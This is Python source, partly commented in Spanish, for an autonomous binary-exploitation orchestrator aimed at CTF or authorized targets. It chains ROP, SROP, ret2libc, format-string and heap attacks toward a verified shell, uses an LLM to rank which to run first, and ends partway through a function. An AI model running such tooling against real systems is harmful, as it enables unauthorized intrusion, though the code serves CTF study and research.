"""Autonomous exploitation orchestrator.

Given a binary, it tries a sequence of attack combinations end to end, verifying which
actually work, and feeds everything it learns (mitigations, sinks, gadgets, offsets,
successful chains) back into the knowledge base so future runs improve. For AUTHORIZED
targets / CTF only."""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, List, Optional, Tuple

from ..oracles import build_registry
from .vulnhunt import run_hunt
from .verify import auto_verify
from .autopoc import autopoc, find_win


@dataclass
class AutopwnResult:
    binary: str
    log: List[str] = field(default_factory=list)
    attempts: List[Tuple[str, Optional[bool], str]] = field(default_factory=list)  # (name, ok, detail)
    verified_findings: int = 0
    win_exploit: bool = False
    ai_plan: str = ""
    ai_conclusion: str = ""
    # contexto del binario (defensas/primitivas), para que el informe refleje POR QUE cada tecnica
    arch: str = ""
    bits: str = ""
    mit: dict = field(default_factory=dict)      # nx/pic/canary/relro, tal cual los da checksec
    sinks: List[str] = field(default_factory=list)
    has_win: bool = False


def autopwn(binary: str, config=None, store=None,
            on_step: Optional[Callable[[str], None]] = None, run: bool = True, llm=None,
            techniques: Optional[List[str]] = None) -> AutopwnResult:
    res = AutopwnResult(binary=binary)

    def log(m: str):
        res.log.append(m)
        if on_step:
            on_step(m)

    def learn(fact: str):
        if store:
            store.add_knowledge("autopwn", fact)

    def want(t: str) -> bool:
        return (not techniques) or (t in techniques)

    # PE (Windows): todo lo demas en esta funcion asume ELF (pwntools ELF()/ROP(), checksec de
    # r2 interpretado como NX/PIE/canary de ELF, etc.) -- en vez de intentar colar un formato
    # distinto por cada combo, se desvia aqui a su propio camino (ret2win bajo Wine).
    from .autopoc_pe import autopoc_pe, is_pe
    if is_pe(binary):
        res.arch, res.bits = "x86", "64"
        log("[recon] formato PE detectado -> ret2win bajo Wine (autopoc_pe)")
        if run and want("ret2win"):
            try:
                rp = autopoc_pe(binary, run=run)
                verdict = True if rp.get("verified") else (None if rp.get("ok") else False)
                res.attempts.append(("ret2win-pe", verdict, rp.get("detail") or rp.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rp.get("verified"))
                log(f"[combo] ret2win (PE/Wine) -> {'SHELL VERIFICADA' if rp.get('verified') else 'no verificado'}")
                learn(f"ret2win-pe verified={rp.get('verified')} {rp.get('detail','')}")
            except Exception as e:
                res.attempts.append(("ret2win-pe", False, str(e)))
        return res

    reg = build_registry(binary)

    # 1) recon facts -> feed the KB
    cs = reg.get("r2_checksec").run()
    mit = cs.meta if cs.ok else {}
    arch = mit.get("arch", "?"); bits = mit.get("bits", "?")
    log(f"[recon] arch={arch} {bits}-bit  NX={mit.get('nx')}  PIE={mit.get('pic')}  canary={mit.get('canary')}")
    learn(f"recon {arch}/{bits}: NX={mit.get('nx')} PIE={mit.get('pic')} canary={mit.get('canary')}")

    sinks = reg.get("r2_sinks").run()
    sink_names = sinks.meta.get("sinks", []) if sinks.ok else []
    log(f"[recon] sinks: {', '.join(sink_names) or 'ninguno'}")
    learn(f"sinks: {sink_names}")

    # guarda el contexto estructurado para el informe (no solo en la traza)
    res.arch, res.bits, res.mit, res.sinks = str(arch), str(bits), dict(mit), list(sink_names)
    res.has_win = find_win(binary) is not None

    gad = reg.get("r2_rop").run(filter="pop rdi") if reg.get("r2_rop") else None
    has_pop_rdi = bool(gad and gad.ok and gad.meta.get("count", 0) > 0)
    log(f"[recon] gadget 'pop rdi': {'si' if has_pop_rdi else 'no'}")
    if has_pop_rdi:
        learn("gadget pop rdi disponible")

    # 1b) let the AI decide what to try, based on what it sees (facts above)
    ai_order = None
    if llm is not None and getattr(llm, "available", lambda: False)():
        facts = (f"arch={arch} {bits}-bit; NX={mit.get('nx')}; PIE={mit.get('pic')}; "
                 f"canary={mit.get('canary')}; sinks={sink_names}; pop_rdi={has_pop_rdi}; "
                 f"win_function={'si' if find_win(binary) else 'no'}")
        prior = ""
        if store:
            prior = "\n".join("- " + k["content"] for k in store.get_knowledge(limit=8))
        ai_order, reasoning = _ai_plan(llm, facts, prior)
        res.ai_plan = reasoning
        if reasoning:
            log("[ia] plan: " + reasoning.replace("\n", " ")[:300])
        if store and reasoning:
            learn("plan IA: " + reasoning[:400])

    # 2) hunt + deterministic verification -> feed verified facts
    hunt = run_hunt(reg, binary, llm=None, config=config, store=store)
    findings, _ = auto_verify(reg, hunt.findings, store=store)
    res.verified_findings = sum(1 for f in findings if f.verdict == "verified")
    log(f"[verify] hallazgos verificados por angr: {res.verified_findings}")
    if store:
        store.save_verified_facts(findings, arch, bits, cs.data if cs.ok else "")

    # 3) try combinations — built as a sorted closure list so ai_order changes EXECUTION
    # order (not just display order). Each closure checks its own applicability gates and
    # the shared res.win_exploit flag; once a shell is verified, later closures bail early.
    win = find_win(binary)
    is_pie = str(mit.get("pic", "")).lower() in ("true", "1")
    canary_on = str(mit.get("canary", "")).lower() in ("true", "1")
    relro_full = "full" in str(mit.get("relro", "")).lower()

    _combos: list = []  # [(name, fn)]

    def _reg(name, fn):
        _combos.append((name, fn))

    # --- combo A: ret2win ---
    def _do_ret2win():
        if res.win_exploit:
            return
        if want("ret2win") and win is not None and not canary_on:
            log("[combo] ret2win: construyendo y verificando en sandbox..." + (" (PIE)" if is_pie else ""))
            try:
                if is_pie:
                    from .autopie import autopie_ret2win
                    rp = autopie_ret2win(binary, run=run)
                    verdict = True if rp.get("verified") else (None if rp.get("ok") else False)
                    res.attempts.append(("ret2win", verdict, rp.get("detail") or rp.get("note", "")))
                    res.win_exploit = res.win_exploit or bool(rp.get("verified"))
                    log(f"[combo] ret2win (PIE) -> {'FUNCIONA (verificado)' if rp.get('verified') else 'no verificado'}")
                    learn(f"ret2win-pie verified={rp.get('verified')} {rp.get('detail','')}")
                else:
                    r = autopoc(binary, run=run)
                    res.attempts.append(("ret2win", r.verified, f"offset={r.offset} win={hex(win)}"))
                    res.win_exploit = res.win_exploit or r.verified
                    log(f"[combo] ret2win -> {'FUNCIONA (verificado)' if r.verified else ('construido, no verificado' if r.ok else 'no aplicable')}")
                    learn(f"ret2win verified={r.verified} offset={r.offset} win={hex(win)}")
            except Exception as e:
                res.attempts.append(("ret2win", False, str(e)))
                log(f"[combo] ret2win error: {e}")
        elif want("ret2win") and win is not None and canary_on:
            log("[combo] ret2win: canary activo -> el overflow lineal se omite, se usa el bypass por fuga (combo canary)")
        elif want("ret2win"):
            log("[combo] ret2win: no hay funcion gift -> se omite")
    _reg("ret2win", _do_ret2win)

    # --- combo A2: SROP ---
    def _do_srop():
        if not run or res.win_exploit:
            return
        if not (want("srop") and not is_pie and win is None):
            return
        log("[combo] SROP: sigreturn -> execve('/bin/sh') (sandbox)...")
        try:
            from .autosrop import autosrop
            rs = autosrop(binary)
            verdict = True if rs.get("verified") else (None if rs.get("ok") else False)
            res.attempts.append(("srop", verdict, rs.get("detail") or rs.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rs.get("verified"))
            log(f"[combo] SROP -> {'SHELL VERIFICADA' if rs.get('verified') else 'no verificado'}")
            learn(f"srop verified={rs.get('verified')} {rs.get('detail','')}")
        except Exception as e:
            res.attempts.append(("srop", False, str(e)))
    _reg("srop", _do_srop)

    # --- combo A2b: SROP aarch64 ---
    def _do_srop_aarch64():
        if not run or res.win_exploit:
            return
        if not (want("srop-aarch64") and "arm" in (arch or "").lower()):
            return
        log("[combo] SROP (aarch64): sigreturn -> execve('/bin/sh') (sandbox/qemu-aarch64)...")
        try:
            from .autosrop_aarch64 import autosrop_aarch64
            ra = autosrop_aarch64(binary)
            verdict = True if ra.get("verified") else (None if ra.get("ok") else False)
            res.attempts.append(("srop-aarch64", verdict, ra.get("detail") or ra.get("note", "")))
            res.win_exploit = res.win_exploit or bool(ra.get("verified"))
            log(f"[combo] SROP (aarch64) -> {'SHELL VERIFICADA' if ra.get('verified') else 'no verificado'}")
            learn(f"srop-aarch64 verified={ra.get('verified')} {ra.get('detail','')}")
        except Exception as e:
            res.attempts.append(("srop-aarch64", False, str(e)))
    _reg("srop-aarch64", _do_srop_aarch64)

    # --- combo A3: ret2csu ---
    def _do_ret2csu():
        if res.win_exploit or not want("ret2csu"):
            return
        try:
            from .autocsu import autocsu, _csu_applicable
            if _csu_applicable(binary):
                log("[combo] ret2csu: gadgets universales de __libc_csu_init (sandbox)...")
                rcu = autocsu(binary)
                verdict = True if rcu.get("verified") else (None if rcu.get("ok") else False)
                res.attempts.append(("ret2csu", verdict, rcu.get("detail") or rcu.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rcu.get("verified"))
                log(f"[combo] ret2csu -> {'SHELL VERIFICADA' if rcu.get('verified') else 'no verificado'}")
                learn(f"ret2csu verified={rcu.get('verified')} {rcu.get('detail','')}")
        except Exception as e:
            res.attempts.append(("ret2csu", False, str(e)))
    _reg("ret2csu", _do_ret2csu)

    # --- combo A4: stack pivot ---
    def _do_pivot():
        if res.win_exploit or not want("pivot"):
            return
        try:
            from .autopivot import autopivot, _pivot_applicable
            if _pivot_applicable(binary):
                log("[combo] stack pivot: overflow corto -> migracion RSP a buffer .bss (sandbox)...")
                rpv = autopivot(binary)
                verdict = True if rpv.get("verified") else (None if rpv.get("ok") else False)
                res.attempts.append(("pivot", verdict, rpv.get("detail") or rpv.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rpv.get("verified"))
                log(f"[combo] stack pivot -> {'SHELL VERIFICADA' if rpv.get('verified') else 'no verificado'}")
                learn(f"pivot verified={rpv.get('verified')} {rpv.get('detail','')}")
        except Exception as e:
            res.attempts.append(("pivot", False, str(e)))
    _reg("pivot", _do_pivot)

    # --- combo A5: callme ---
    def _do_callme():
        if res.win_exploit or not want("callme"):
            return
        try:
            from .autocallme import autocallme, _callme_applicable
            if _callme_applicable(binary):
                log("[combo] callme: varias funciones con argumentos validados (sandbox)...")
                rcm = autocallme(binary)
                verdict = True if rcm.get("verified") else (None if rcm.get("ok") else False)
                res.attempts.append(("callme", verdict, rcm.get("detail") or rcm.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rcm.get("verified"))
                log(f"[combo] callme -> {'SHELL VERIFICADA' if rcm.get('verified') else 'no verificado'}")
                learn(f"callme verified={rcm.get('verified')} {rcm.get('detail','')}")
        except Exception as e:
            res.attempts.append(("callme", False, str(e)))
    _reg("callme", _do_callme)

    # --- combo A6: write4 ---
    def _do_write4():
        if res.win_exploit or not want("write4"):
            return
        try:
            from .autowrite4 import autowrite4, _write4_applicable
            if _write4_applicable(binary):
                log("[combo] write4: write-what-where + llamada (sandbox)...")
                rw4 = autowrite4(binary)
                verdict = True if rw4.get("verified") else (None if rw4.get("ok") else False)
                res.attempts.append(("write4", verdict, rw4.get("detail") or rw4.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rw4.get("verified"))
                log(f"[combo] write4 -> {'SHELL VERIFICADA' if rw4.get('verified') else 'no verificado'}")
                learn(f"write4 verified={rw4.get('verified')} {rw4.get('detail','')}")
        except Exception as e:
            res.attempts.append(("write4", False, str(e)))
    _reg("write4", _do_write4)

    # --- combo A7: badchars ---
    def _do_badchars():
        if res.win_exploit or not want("badchars"):
            return
        try:
            from .autobadchars import autobadchars, _badchars_applicable
            if _badchars_applicable(binary):
                log("[combo] badchars: write-what-where pasando filtro de entrada (sandbox)...")
                rbc = autobadchars(binary)
                verdict = True if rbc.get("verified") else (None if rbc.get("ok") else False)
                res.attempts.append(("badchars", verdict, rbc.get("detail") or rbc.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rbc.get("verified"))
                log(f"[combo] badchars -> {'SHELL VERIFICADA' if rbc.get('verified') else 'no verificado'}")
                learn(f"badchars verified={rbc.get('verified')} {rbc.get('detail','')}")
        except Exception as e:
            res.attempts.append(("badchars", False, str(e)))
    _reg("badchars", _do_badchars)

    # --- combo B: ROP chain ---
    def _do_rop_chain():
        if res.win_exploit or not want("rop-chain"):
            return
        log("[combo] cadena ROP: intentando construir..." + (" (PIE)" if is_pie else ""))
        try:
            if is_pie:
                from .autopie import autopie_rop
                rr = autopie_rop(binary, run=run)
            else:
                from .autopoc import autorop
                rr = autorop(binary, run=run)
            verdict = True if rr.get("verified") else (None if rr.get("ok") else False)
            detail = (rr.get("strategy", "") + (" -> SHELL verificada" if rr.get("verified") else
                      " (construida)" if rr.get("ok") else "")) or rr.get("detail") or rr.get("note", "")
            res.attempts.append(("rop-chain", verdict, detail or rr.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rr.get("verified"))
            log(f"[combo] cadena ROP -> {'SHELL VERIFICADA' if rr.get('verified') else ('construida' if rr.get('ok') else 'no automatica')}")
            learn(f"rop verified={rr.get('verified')} strategy={rr.get('strategy') or rr.get('detail')}")
        except Exception as e:
            res.attempts.append(("rop-chain", False, str(e)))
    _reg("rop-chain", _do_rop_chain)

    # --- combo B2: ret2libc ---
    def _do_ret2libc():
        if res.win_exploit or not want("ret2libc"):
            return
        log("[combo] ret2libc con leak (fuga libc -> system, sandbox)...")
        try:
            from .autolibc import autolibc
            rl = autolibc(binary)
            verdict = True if rl.get("verified") else (None if rl.get("ok") else False)
            res.attempts.append(("ret2libc", verdict, rl.get("detail") or rl.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rl.get("verified"))
            log(f"[combo] ret2libc -> {'SHELL VERIFICADA' if rl.get('verified') else 'no aplicable/verificable'}")
            learn(f"ret2libc verified={rl.get('verified')} {rl.get('detail','')}")
        except Exception as e:
            res.attempts.append(("ret2libc", False, str(e)))
    _reg("ret2libc", _do_ret2libc)

    # --- combo C: shellcode-stack ---
    def _do_shellcode_stack():
        if not want("shellcode-stack"):
            return
        if str(mit.get("nx", "")).lower() in ("false", "0", "nx_off"):
            res.attempts.append(("shellcode-stack", True, "NX desactivado -> shellcode en stack viable"))
            log("[combo] NX off -> shellcode en stack viable")
            learn("shellcode-stack viable (NX off)")
    _reg("shellcode-stack", _do_shellcode_stack)

    # --- combo C2: mprotect+shellcode ---
    def _do_mprotect_shellcode():
        if res.win_exploit or not want("mprotect-shellcode"):
            return
        if str(mit.get("nx", "")).lower() in ("false", "0", "nx_off"):
            return
        log("[combo] mprotect()+shellcode: ROP a mprotect() sobre un buffer fijo -> shellcode real...")
        try:
            from .autoropmprotect import autoropmprotect
            rm = autoropmprotect(binary)
            verdict = True if rm.get("verified") else (None if rm.get("ok") else False)
            res.attempts.append(("mprotect-shellcode", verdict, rm.get("detail") or rm.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rm.get("verified"))
            log(f"[combo] mprotect()+shellcode -> {'SHELL VERIFICADA' if rm.get('verified') else 'no aplicable/verificable'}")
            learn(f"mprotect-shellcode verified={rm.get('verified')} {rm.get('detail','')}")
        except Exception as e:
            res.attempts.append(("mprotect-shellcode", False, str(e)))
    _reg("mprotect-shellcode", _do_mprotect_shellcode)

    # --- combo C3: leak-chain ---
    def _do_leak_chain():
        if res.win_exploit or not want("leak-chain"):
            return
        log("[combo] infoleak chaining: OOB read -> libc_base -> write-what-where -> shell...")
        try:
            from .autoleakchain import autoleakchain
            rk = autoleakchain(binary)
            verdict = True if rk.get("verified") else (None if rk.get("ok") else False)
            res.attempts.append(("leak-chain", verdict, rk.get("detail") or rk.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rk.get("verified"))
            log(f"[combo] infoleak chaining -> {'SHELL VERIFICADA' if rk.get('verified') else 'no aplicable/verificable'}")
            learn(f"leak-chain verified={rk.get('verified')} {rk.get('detail','')}")
        except Exception as e:
            res.attempts.append(("leak-chain", False, str(e)))
    _reg("leak-chain", _do_leak_chain)

    # --- combo D: format-string ---
    def _do_format_string():
        if not (want("format-string") and any(s in sink_names for s in ("printf", "fprintf", "snprintf"))):
            return
        log("[combo] format-string: intentando GOT overwrite -> shell (sandbox)...")
        try:
            from .autofmt import autofmt
            rf = autofmt(binary)
            verdict = True if rf.get("verified") else (None if rf.get("ok") else False)
            res.attempts.append(("format-string", verdict, rf.get("detail") or rf.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rf.get("verified"))
            log(f"[combo] format-string -> {'SHELL VERIFICADA' if rf.get('verified') else 'no verificable (requiere printf en bucle)'}")
            learn(f"format-string verified={rf.get('verified')} {rf.get('detail','')}")
        except Exception as e:
            res.attempts.append(("format-string", False, str(e)))
    _reg("format-string", _do_format_string)

    # --- combo E: heap-corruption ---
    def _do_heap():
        if not want("heap"):
            return
        heap_tool = reg.get("r2_heap")
        has_heap = False
        if heap_tool:
            _hr = heap_tool.run()
            has_heap = _hr.ok and _hr.meta.get("heap", False)
        if not has_heap:
            return
        log("[combo] heap: confirmando corrupcion (double-free/overflow) en sandbox...")
        try:
            from .autoheap import autoheap
            rh = autoheap(binary)
            if rh.get("confirmed"):
                kinds = ", ".join(sorted({h["kind"] for h in rh.get("hits", [])}))
                res.attempts.append(("heap-corruption", True, f"confirmada ({kinds})"))
                log(f"[combo] heap -> CORRUPCION CONFIRMADA ({kinds})")
                learn(f"heap-corruption confirmed kinds={kinds}")
            else:
                res.attempts.append(("heap-corruption", None, rh.get("note", "")))
                log("[combo] heap -> no disparada con entradas de prueba")
        except Exception as e:
            res.attempts.append(("heap-corruption", False, str(e)))
    _reg("heap", _do_heap)

    # --- combo F: heap-to-shell families ---
    # Pre-load applicable families at definition time (before sort) so the AI can
    # reorder them individually. Each family gets its own closure via _make_heap_fn.
    if run:
        try:
            from .autoheap import autoheap_shell, _heap_shell_applicable
            from .autouaf import autouaf_shell, _uaf_applicable
            from .autotcachedup import autotcachedup_shell, _tcache_dup_applicable
            from .autowow import autowow_shell, _wow_applicable
            from .autohof import autohof, _hof_applicable
            from .autohos import autohos, _hos_applicable
            from .autohoe import autohoe, _hoe_applicable
            from .autobotcake import autobotcake, _botcake_applicable
            from .autolargebin import autolargebin, _largebin_applicable
            from .autohomind import autohomind, _homind_applicable
            from .autoiofile import autoiofile, _iofile_applicable
            from .autofastbindup import autofastbindup, _fastbindup_applicable
            from .autounsafeunlink import autounsafeunlink, _unsafeunlink_applicable
            from .autohoc import autohoc, _hoc_applicable
            from .autostash import autostash, _stash_applicable
            _heap_family_specs = []
            if want("heap-shell") and _heap_shell_applicable(binary):
                _heap_family_specs.append(("heap-shell", autoheap_shell, "tcache poison -> free@GOT=win"))
            if want("uaf-funcptr") and _uaf_applicable(binary):
                _heap_family_specs.append(("uaf-funcptr", autouaf_shell, "UAF reuso de chunk -> funcptr=win"))
            if want("tcache-dup") and _tcache_dup_applicable(binary):
                _heap_family_specs.append(("tcache-dup", autotcachedup_shell, "tcache dup -> GOT=system"))
            if want("write-what-where") and _wow_applicable(binary):
                _heap_family_specs.append(("write-what-where", autowow_shell, "indice sin comprobar -> GOT=win"))
            if want("house-of-force") and _hof_applicable(binary):
                _heap_family_specs.append(("house-of-force", autohof, "top-chunk pre-2.29 -> top arbitrario -> hijack"))
            if want("house-of-spirit") and _hos_applicable(binary):
                _heap_family_specs.append(("house-of-spirit", autohos, "chunk falso en tcache -> hijack"))
            if want("house-of-einherjar") and _hoe_applicable(binary):
                _heap_family_specs.append(("house-of-einherjar", autohoe, "consolidacion hacia atras -> hijack"))
            if want("house-of-botcake") and _botcake_applicable(binary):
                _heap_family_specs.append(("house-of-botcake", autobotcake, "doble-free via unsorted -> tcache poison"))
            if want("largebin-attack") and _largebin_applicable(binary):
                _heap_family_specs.append(("largebin-attack", autolargebin, "insercion en largebin -> escritura de puntero"))
            if want("house-of-mind") and _homind_applicable(binary):
                _heap_family_specs.append(("house-of-mind", autohomind, "ar_ptr forjado -> insercion en fastbin arbitraria"))
            if want("iofile-fsop") and _iofile_applicable(binary):
                _heap_family_specs.append(("iofile-fsop", autoiofile, "vtable de _IO_FILE reapuntada -> __overflow(fp)"))
            if want("fastbin-dup") and _fastbindup_applicable(binary):
                _heap_family_specs.append(("fastbin-dup", autofastbindup, "doble-free A,B,A (pre-safe-linking) -> fd envenenado"))
            if want("unsafe-unlink") and _unsafeunlink_applicable(binary):
                _heap_family_specs.append(("unsafe-unlink", autounsafeunlink, "bypass del chequeo 2.3.4+ -> ptr cerca de si mismo"))
            if want("house-of-corrosion") and _hoc_applicable(binary):
                _heap_family_specs.append(("house-of-corrosion", autohoc, "global_max_fast corrompido -> indice de fastbin sin cota"))
            if want("tcache-stash") and _stash_applicable(binary):
                _heap_family_specs.append(("tcache-stash", autostash, "stash de smallbin->tcache -> chunk falso stashed"))
        except Exception as e:
            _heap_family_specs = []
            log(f"[combo] heap-shell families no disponibles: {e}")

        def _make_heap_fn(hname, hfn, hdesc):
            def _do():
                if res.win_exploit:
                    return
                log(f"[combo] {hname}: {hdesc} (sandbox)...")
                try:
                    rx = hfn(binary)
                    verdict = True if rx.get("verified") else (None if rx.get("ok") else False)
                    res.attempts.append((hname, verdict, rx.get("detail") or rx.get("note", "")))
                    res.win_exploit = res.win_exploit or bool(rx.get("verified"))
                    log(f"[combo] {hname} -> {'SHELL VERIFICADA' if rx.get('verified') else 'no verificado'}")
                    learn(f"{hname} verified={rx.get('verified')} {rx.get('detail','')}")
                except Exception as ex:
                    res.attempts.append((hname, False, str(ex)))
            return _do
        for _hname, _hfn, _hdesc in _heap_family_specs:
            _reg(_hname, _make_heap_fn(_hname, _hfn, _hdesc))

    # --- combo G: canary-bypass ---
    def _do_canary():
        if not (run and want("canary") and canary_on and win is not None):
            return
        log("[combo] canary: fuga del canary + overflow a win (sandbox)...")
        try:
            from .autocanary import autocanary
            rc = autocanary(binary)
            verdict = True if rc.get("verified") else (None if rc.get("ok") else False)
            res.attempts.append(("canary-bypass", verdict, rc.get("detail") or rc.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rc.get("verified"))
            log(f"[combo] canary -> {'SHELL VERIFICADA' if rc.get('verified') else 'no verificado'}")
            learn(f"canary-bypass verified={rc.get('verified')} {rc.get('detail','')}")
        except Exception as e:
            res.attempts.append(("canary-bypass", False, str(e)))
    _reg("canary-bypass", _do_canary)

    # --- combo H: ret2dlresolve ---
    def _do_dlresolve():
        if not (run and want("dlresolve") and not is_pie and not relro_full
                and win is None and not res.win_exploit and "system" not in sink_names):
            return
        log("[combo] ret2dlresolve: shell sin leak forjando el resolver dinamico (sandbox)...")
        try:
            from .autodlresolve import autodlresolve
            rd = autodlresolve(binary)
            verdict = True if rd.get("verified") else (None if rd.get("ok") else False)
            res.attempts.append(("ret2dlresolve", verdict, rd.get("detail") or rd.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rd.get("verified"))
            log(f"[combo] ret2dlresolve -> {'SHELL VERIFICADA' if rd.get('verified') else 'no verificado'}")
            learn(f"ret2dlresolve verified={rd.get('verified')} {rd.get('detail','')}")
        except Exception as e:
            res.attempts.append(("ret2dlresolve", False, str(e)))
    _reg("ret2dlresolve", _do_dlresolve)

    # Sort by AI plan BEFORE executing — ai_order now controls what RUNS first, not just
    # what displays first. Techniques not in ai_order fall to rank 99 (tried last).
    if ai_order:
        _rank = {t: i for i, t in enumerate(ai_order)}
        _combos.sort(key=lambda x: _rank.get(x[0], 99))
        log("[ia] orden de EJECUCION priorizado: " + ", ".join(ai_order))

    # Execute combos in AI-prioritized order; each closure checks its own applicability
    # and res.win_exploit (once a shell is verified, later combos bail early).
    for _cname, _cfn in _combos:
        _cfn()

    # AI conclusion after all combos finish
    if llm is not None and getattr(llm, "available", lambda: False)():
        res.ai_conclusion = _ai_conclude(llm, res)
        if res.ai_conclusion:
            log("[ia] conclusion generada")
            learn("conclusion IA: " + res.ai_conclusion[:400])

    log("[fin] combinaciones probadas: " + ", ".join(a[0] for a in res.attempts))
    return res


_AUTOPWN_TECHNIQUES = (
    # Stack / control-flow
    "ret2win",          # win() present, no canary — direct ret to gift
    "srop",             # no-PIE, no win(), syscall gadget — sigreturn execve
    "srop-aarch64",     # ARM64 — svc #139 sigreturn execve
    "ret2csu",          # no pop-rsi/rdx — __libc_csu_init gadgets
    "pivot",            # short overflow — leave;ret migrates RSP to staged chain
    "callme",           # pop-rdi/rsi/rdx available, gift split across functions
    "write4",           # write-what-where via pop+mov pair, then call
    "badchars",         # write4 shape but input filtered — XOR-encode the string
    "rop-chain",        # ret2libc / execve full chain (generic ROP)
    "ret2libc",         # dynamic binary — puts@GOT leak -> system
    "ret2dlresolve",    # dynamic no-PIE, no win, no leak — forge linker resolver
    "canary-bypass",    # canary ON + win() — leak canary then overflow to win
    # NX bypass / shellcode
    "shellcode-stack",  # NX off — shellcode directly on stack
    "mprotect-shellcode", # NX on — ROP mprotect() then shellcode
    # Format-string
    "format-string",    # printf-family sink — GOT overwrite via %n
    # Heap exploitation families
    "heap-shell",       # tcache poison -> free@GOT = win
    "uaf-funcptr",      # UAF — reuse chunk -> funcptr = win
    "tcache-dup",       # double-free tcache -> GOT = system
    "write-what-where", # unchecked index -> GOT = win
    "house-of-force",   # top-chunk pre-2.29 -> arbitrary malloc
    "house-of-spirit",  # fake chunk in tcache -> hijack
    "house-of-einherjar", # backwards consolidation -> overlap
    "house-of-botcake", # double-free via unsorted -> tcache poison
    "largebin-attack",  # largebin insertion -> pointer write
    "house-of-mind",    # forged ar_ptr -> fastbin
    "iofile-fsop",      # _IO_FILE vtable -> __overflow
    "fastbin-dup",      # pre-safe-linking A,B,A double-free
    "unsafe-unlink",    # bypass 2.3.4+ check -> ptr near itself
    "house-of-corrosion", # global_max_fast -> unbounded fastbin index
    "tcache-stash",     # smallbin->tcache stash -> fake chunk
    "leak-chain",       # OOB read -> libc base -> write-what-where
)

_AUTOPWN_TECH_PATTERN = "|".join(
    _t.replace("-", r"[\-_]?")  # accept both dash and underscore variants
    for _t in sorted(_AUTOPWN_TECHNIQUES, key=len, reverse=True)  # longest first
)


def _ai_plan(llm, facts: str, prior: str):
    from ..llm.base import Message
    import re as _re

    _tech_list = "\n".join(f"  - {t}" for t in _AUTOPWN_TECHNIQUES)
    sys_prompt = (
        "Eres un analista de explotacion de binarios. Tu tarea: dado un conjunto de hechos del "
        "binario objetivo, priorizar las tecnicas de explotacion disponibles en el orden mas "
        "probable de exito, de mayor a menor. No tienes que probarlas — solo ordenarlas.\n\n"
        "Razona brevemente (2-4 frases) basandote SOLO en los hechos dados, luego escribe una "
        "linea exactamente con el formato:\n"
        "ORDEN: t1, t2, t3, ...\n\n"
        "usando EXACTAMENTE los nombres de esta lista (sin inventar nuevos):\n"
        f"{_tech_list}\n\n"
        "Reglas:\n"
        "- Incluye solo las tecnicas que tengan sentido dado el perfil del binario. "
        "Las que no incluyas quedan con prioridad baja por defecto.\n"
        "- ret2win requiere una funcion gift; srop requiere gadget syscall + string '/bin/sh'; "
        "shellcode-stack requiere NX desactivado; heap-* requieren operaciones de heap; "
        "canary-bypass requiere canary activo + gift; ret2dlresolve requiere dinamico + no-PIE.\n"
        "- Si el binario es aarch64, srop-aarch64 va antes que srop.\n"
        "- Usa solo la evidencia dada — no inventes hechos."
    )
    user = f"Hechos del binario:\n{facts}" + (f"\n\nConocimiento previo de sesiones anteriores:\n{prior}" if prior else "")
    try:
        txt = llm.chat([Message("system", sys_prompt), Message("user", user)])
    except Exception:
        return None, ""
    order = None
    for line in txt.splitlines():
        if "ORDEN" in line.upper():
            toks = _re.findall(_AUTOPWN_TECH_PATTERN, line.lower())
            # Normalize: replace underscores with dashes to match the canonical names
            normalized = [t.replace("_", "-") for t in toks]
            # Keep only names that exist in the master list
            valid = [t for t in normalized if t in _AUTOPWN_TECHNIQUES]
            if valid:
                order = list(dict.fromkeys(valid))  # dedup preserving order
            break
    return order, txt.strip()


def _ai_conclude(llm, res) -> str:
    from ..llm.base import Message
    table = "\n".join(f"- {n}: {('funciona' if ok is True else ('no' if ok is False else 'posible'))} ({d})"
                       for n, ok, d in res.attempts)
    sys = ("Eres un analista de explotacion. Resume en 2-4 frases que combinacion funciono, por que, "
           "y cual seria el siguiente paso concreto. Usa solo los resultados dados, no inventes.")
    user = f"Binario: {res.binary}\nResultados:\n{table}\nExploit ret2win verificado: {res.win_exploit}"
    try:
        return llm.chat([Message("system", sys), Message("user", user)]).strip()
    except Exception:
        return ""


def _flag(v) -> bool:
    return str(v).lower() in ("true", "1")


def _why(mit: dict, has_win: bool, technique: str) -> str:
    """Razon 'defensa -> tecnica': por que ESTA tecnica es la adecuada para este contexto."""
    t = (technique or "").lower()
    pie = _flag(mit.get("pic")); _flag(mit.get("canary"))
    if "canary" in t:
        return "canary ACTIVO + win() + buffer impreso -> fuga del canary, reescritura y overflow a win()"
    if "ret2win" in t:
        return ("win() presente" + (" con PIE -> se resuelve la base en sandbox" if pie
                else " sin canary -> retorno directo a win() (direccion fija)"))
    if "ret2libc" in t:
        return "sin win(): fuga de libc (puts@GOT) -> base -> system('/bin/sh')"
    if "srop-aarch64" in t or ("srop" in t and "aarch64" in t):   # antes del 'srop' generico
        return "binario aarch64 -> SROP: rt_sigreturn (svc #139) restaura un sigframe forjado y ejecuta execve('/bin/sh')"
    if "srop" in t:            # antes de 'rop' (substring): SROP es una tecnica distinta
        return "binario pobre en gadgets con gadget syscall + '/bin/sh' -> SROP: un rt_sigreturn restaura TODOS los registros desde un frame forjado y ejecuta execve('/bin/sh')"
    if "csu" in t:             # antes de 'rop' (substring): ret2csu es distinto del ROP generico
        return "sin pop rsi/pop rdx propios -> los dos gadgets universales de __libc_csu_init fijan rdi/rsi/rdx y hacen una llamada indirecta"
    if "pivot" in t:
        return "overflow demasiado corto para una cadena completa (solo alcanza saved rbp/rip) -> `leave; ret` migra RSP a un buffer .bss ya escalonado con la cadena real"
    if "callme" in t:
        return "gadget `pop rdi; pop rsi; pop rdx; ret` disponible pero el regalo esta repartido en varias funciones -> se llaman todas, cada una con sus propios argumentos, probando el orden correcto"
    if "write4" in t:
        return "sin win()/string util ya presente -> un gadget pop+mov escalona un nombre de fichero adivinado en memoria y se llama a la funcion que lo abre"
    if "badchars" in t:
